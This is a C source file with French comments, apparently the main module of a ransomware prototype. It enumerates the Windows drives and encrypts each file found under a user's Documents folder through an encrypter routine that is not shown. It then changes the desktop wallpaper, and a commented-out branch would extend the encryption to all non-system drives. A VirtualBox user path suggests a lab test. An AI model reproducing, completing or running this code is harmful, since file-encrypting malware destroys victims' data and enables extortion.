// Placer UNICODE et _UNICODE avant d'inclure windows.h
#define UNICODE
#define _UNICODE
#include <windows.h>
#include <stdint.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <winternl.h>
#include <shlobj.h> // SHGetFolderPath
#include "core/list_files.h"
#include "core/encrypter.h"
#include "core/changeBackground.h"

#pragma comment(lib, "ntdll.lib")

#define CHUNK_SIZE 4096

typedef NTSTATUS(NTAPI *NtOpenFile_t)(
    PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES,
    PIO_STATUS_BLOCK, ULONG, ULONG);
typedef NTSTATUS(NTAPI *NtReadFile_t)(
    HANDLE, HANDLE, PVOID, PVOID, PIO_STATUS_BLOCK,
    PVOID, ULONG, PLARGE_INTEGER, PULONG);
typedef NTSTATUS(NTAPI *NtWriteFile_t)(
    HANDLE, HANDLE, PVOID, PVOID, PIO_STATUS_BLOCK,
    PVOID, ULONG, PLARGE_INTEGER, PULONG);

int chypher_drive(char *dir)
{
    printf("%s", dir);
    FileDataArray *arr = malloc(sizeof(FileDataArray));

    initHandleArray(arr);

    list_files(dir, arr, 0);

    for (int i = 1; i <= arr->length; i++)
    {
        SYSTEMTIME systemTime;

        /*  printf("File n%d : %s \n\t weight : %lu \t last access time : ", i, arr->fd[i].cFileName, (unsigned long)arr->fd[i].nFileSizeHigh);
         FileTimeToSystemTime(&arr->fd[i].ftLastAccessTime, &systemTime);
         printf("%02d-%02d-%d %02d:%02d:%02d\n\n",
                systemTime.wMonth, systemTime.wDay, systemTime.wYear,
                systemTime.wHour, systemTime.wMinute, systemTime.wSecond); */

        char *asciiStr = malloc(MAX_PATH_LENGTH);
        snprintf(asciiStr, MAX_PATH_LENGTH, "\\??\\%s", arr->fd[i].cFileName);
        int len;
        wchar_t wideStr[MAX_PATH_LENGTH]; // Assure-toi que le buffer est assez grand

        // Conversion ASCII (CP_ACP) -> UTF-16
        len = MultiByteToWideChar(CP_ACP, 0, asciiStr, -1, wideStr, MAX_PATH_LENGTH);
        if (len == 0)
        {
            printf("Erreur de conversion de char* en PCWSTR: %lu\n", GetLastError());
            return 1;
        }

        int encryptionRatio = 1;

        PCWSTR pwstr = wideStr;
        encrypter(pwstr, 1);
    }

    // Free the allocated memory for file names
    freeHandleArray(arr);
    return 0;
}

int main()
{
    DWORD drives = GetLogicalDrives();

    if (drives == 0)
    {
        printf("Erreur lors de l’appel à GetLogicalDrives.\n");
        return 1;
    }

    printf("Lecteurs disponibles :\n");
    for (char letter = 'A'; letter <= 'Z'; letter++)
    {
        if (drives & (1 << (letter - 'A')))
        {
            printf("  %c:\\\n", letter);
        }
    }

    // For each drive, call the function chypher_drive
    for (char letter = 'A'; letter <= 'Z'; letter++)
    {
        if (drives & (1 << (letter - 'A')))
        {
            if (letter == 'C')
            {
                printf("Chiffrer le lecteur %c:\\\n", letter);
                char dir[MAX_PATH_LENGTH];
                snprintf(dir, sizeof(dir), "%c:\\Users\\vboxuser\\Documents", letter);
                chypher_drive(dir);
            }
            else
            {
                continue; // Skip the when it's not C drive
            }

            /* if (letter == 'C')
            {
                // C: is the system drive, we don't want to encrypt it
                printf("Skipping C:\\ drive.\n");
                continue;
            }
            else {
                printf("Chiffrer le lecteur %c:\\\n", letter);
                snprintf(dir, sizeof(dir), "%c:", letter);
                chypher_drive(dir);
            } */
        }
    }

    char desktopPath[MAX_PATH];
    if (SHGetFolderPathA(NULL, CSIDL_DESKTOP, NULL, 0, desktopPath) != S_OK)
    {
        fprintf(stderr, "Impossible de récupérer le chemin du bureau.\n");
        return 1;
    }
    printf("Changement du fond d'écran...\n");
    if (finisher(desktopPath) != 0)
    {
        fprintf(stderr, "Erreur lors du changement de fond d'écran.\n");
        return 1;
    }

    printf("Chiffrement termine\n");
    scanf("Press Enter to exit...\n");
    return 0;
}